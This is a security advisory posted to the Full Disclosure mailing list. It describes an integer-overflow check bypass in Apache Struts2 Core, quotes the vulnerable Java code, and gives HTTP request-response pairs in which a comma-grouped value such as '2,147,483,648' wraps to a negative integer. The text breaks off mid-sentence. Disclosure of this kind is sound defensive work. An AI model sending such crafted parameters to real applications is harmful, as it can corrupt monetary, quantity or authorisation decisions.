---
title: Apache Struts2 Core Integer Overflow
url: https://seclists.org/fulldisclosure/2026/Nov/4
source: Full Disclosure
date: 2026-11-02
fetch_date: 2026-11-03T08:51:59.360876
---

# Apache Struts2 Core Integer Overflow

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# Apache Struts2 Core Integer Overflow

---

*From*: Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 29 Oct 2026 14:52:23 +0000

---

```
Description
Apache Struts2 Core version 7.4.0 and below fails to properly prevent integer overflows, causing wrap-arounds and other
issues on a downstream forced casting into types smaller than `BigInteger`.  Importantly, this finding underscores why
all applications using Struts and other such platforms should perform their own input validation checks and not blindly
assume that the upstream Struts2 code has done as such, but the finding also shows that input passed from the upstream
provider may not faithfully represent what the user provided.

Impact
An attacker who can influence a parameter bound to a boxed `Byte`, `Short`, `Integer`, `Long`, or `Character` action
property can submit a numeric string that is both out of range for the target type and formatted using the resolved
locale's grouping separator (e.g. `"2,147,483,648"` under `en_US`) to make `isInRange` silently return `true` instead
of correctly rejecting the value.  Since the swallowed `NumberFormatException` never reaches the caller, execution
proceeds into `DefaultTypeConverter.convertValue`, where the oversized value is narrowed with an unchecked cast such as
`(int) longValue(value)`, silently wrapping it into the target type's range ("2,147,483,648" becomes `-2147483648` for
an `Integer` field) instead of raising the `TypeConversionException` the overflow guard is supposed to produce.  This
lets a value the application assumes was range-validated reach downstream business logic as an unexpected negative,
zero, or otherwise mismatched figure, which can corrupt quantity, monetary, identifier, or other numeric computations
and any authorisation or business-rule decision that depends on the converted value being bounded and faithful to the
caller's submitted intent.

Examples
Sample Code
`NumberConverter.convertValue`, in `core/src/main/java/org/apache/struts2/conversion/impl/NumberConverter.java`, parses
a request string using a grouping-aware `NumberFormat` and then calls `isInRange` with the original, still-grouped
string to confirm the parsed value is within bounds for the target numeric type; `isInRange` re-parses that same
grouped string with `new BigInteger`, and its `catch` block treats the resulting `NumberFormatException` as
confirmation that the value is in range.  Once `isInRange` has incorrectly reported that the value is acceptable,
control returns to `NumberConverter.convertValue`, which delegates to `DefaultTypeConverter.convertValue`; for an
`Integer`-typed target this narrows the value with an unchecked cast, producing the actual silent wraparound.

```java
            } else {
                if (stringValue.isEmpty()) {
                    return null;
                }
                NumberFormat numFormat = NumberFormat.getInstance(getLocale(context));
                ParsePosition parsePos = new ParsePosition(0);
                if (isIntegerType(toType)) {
                    numFormat.setParseIntegerOnly(true);
                }
                numFormat.setGroupingUsed(true);
                Number number = numFormat.parse(stringValue, parsePos);

                if (parsePos.getIndex() != stringValue.length()) {
                    throw new TypeConversionException("Unparseable number: \"" + stringValue + "\" at position "
                        + parsePos.getIndex());
                } else {
                    if (!isInRange(number, stringValue, toType))
                        throw new TypeConversionException("Overflow or underflow casting: \"" + stringValue + "\" into
class " + number.getClass().getName());

                    value = super.convertValue(context, number, toType);
                }
            }
```
Code snippet from `struts2-core`'s core/src/main/java/org/apache/struts2/conversion/impl/NumberConverter.java, lines
57-78

```java
            } else if (int.class == toType || Integer.class == toType) {
                bigValue = new BigInteger(stringValue);
                lowerBound = BigInteger.valueOf(Integer.MIN_VALUE);
                upperBound = BigInteger.valueOf(Integer.MAX_VALUE);
            } else if (long.class == toType || Long.class == toType) {
                bigValue = new BigInteger(stringValue);
                lowerBound = BigInteger.valueOf(Long.MIN_VALUE);
                upperBound = BigInteger.valueOf(Long.MAX_VALUE);
            } else {
                throw new IllegalArgumentException("Unexpected numeric type: " + toType.getName());
            }
        } catch (NumberFormatException e) {
            //shoult it fail here? BigInteger doesnt seem to be so nice parsing numbers as NumberFormat
            return true;
        }
```
Snippet from `struts2-core`'s core/src/main/java/org/apache/struts2/conversion/impl/NumberConverter.java, lines 209-222

```java
if ((toType == Integer.class) || (toType == Integer.TYPE))
    result = (int) longValue(value);
```
Code snippet from `struts2-core`'s core/src/main/java/org/apache/struts2/conversion/impl/DefaultTypeConverter.java,
lines 122-123, showing the casting to `int` that causes the wrap-around

Sample Request-Response Pairs
`org.apache.struts2.showcase.ajax.Example5Action`, reachable via `/showcase/showcase/ajax/example5.action`, exposes a
boxed `Integer age` property behind a `@StrutsParameter`-annotated setter, so the overflow guard bypass in
`struts2-core` is reachable through this action's ordinary input binding.  The four live probes below, each issued on a
freshly established session with devMode's `DebuggingInterceptor` set to `debug=command&expression=age` so that the
bound value can be read straight off the per-request value stack, isolate the defect to the comma -- the first probe
submits `Integer.MAX_VALUE + 1` with a grouping separator and receives the wrapped, unrelated negative value; the first
control submits the identical magnitude without a comma and that is correctly rejected; the second control submits a
genuinely in-range grouped value that converts correctly; and the third control submits a bare baseline value that
converts correctly.

```http
GET
/showcase/showcase/ajax/example5.action?age=2%2C147%2C483%2C648&name=overflow-grouped-probe&debug=command&expression=age
 HTTP/1.1
Host: 127.0.0.1:8383
```
A request containing a value too large to fit in an `int` -- `age=2,147,483,648` (`Integer.MAX_VALUE + 1`)

```http
HTTP/1.1 200
Content-Type: text/plain;charset=ISO-8859-1
Content-Length: 11

-2147483648
```
The server accepts the request and the parameter bypasses the overflow guard, is cast to an `int`, and wraps-around to
`-2147483648` instead of raising a `TypeConversionException`

```http
GET /showcase/showcase/ajax/example5.action?age=2147483648&name=overflow-ungrouped-control&debug=command&expression=age
HTTP/1.1
Host: 127.0.0.1:8383
```
A request containing a value too large to fit in an `int` -- `age=2147483648` -- but without a grouping separator

```http
HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 3154

<!-- ... --><html>...<title>Struts Problem Report</title>...
```
The server correctly rejec...